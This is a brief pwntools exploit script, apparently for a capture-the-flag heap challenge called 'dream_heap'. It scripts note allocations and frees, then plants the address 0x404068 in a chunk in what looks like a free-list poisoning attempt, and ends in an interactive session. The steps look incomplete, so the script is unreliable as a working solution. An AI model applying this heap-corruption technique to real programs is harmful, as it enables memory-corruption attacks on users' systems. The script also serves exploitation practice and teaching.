from pwn import *

context.binary = './dream_heap'
p = process('./dream_heap')

def add(idx, size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Content: ", data)

def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Index: ", str(idx))

def view(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Index: ", str(idx))
    p.recvuntil("Note: ")
    return p.recvline()

add(0, 0x60, b"A"*8)
add(1, 0x60, b"B"*8)

delete(0)
delete(1)

add(2, 0x60, p64(0x404068))
add(3, 0x60, b"JUNK")
add(4, 0x60, b"KILL")

p.sendlineafter("> ", "3")
p.sendlineafter("Index: ", "2")

p.interactive()
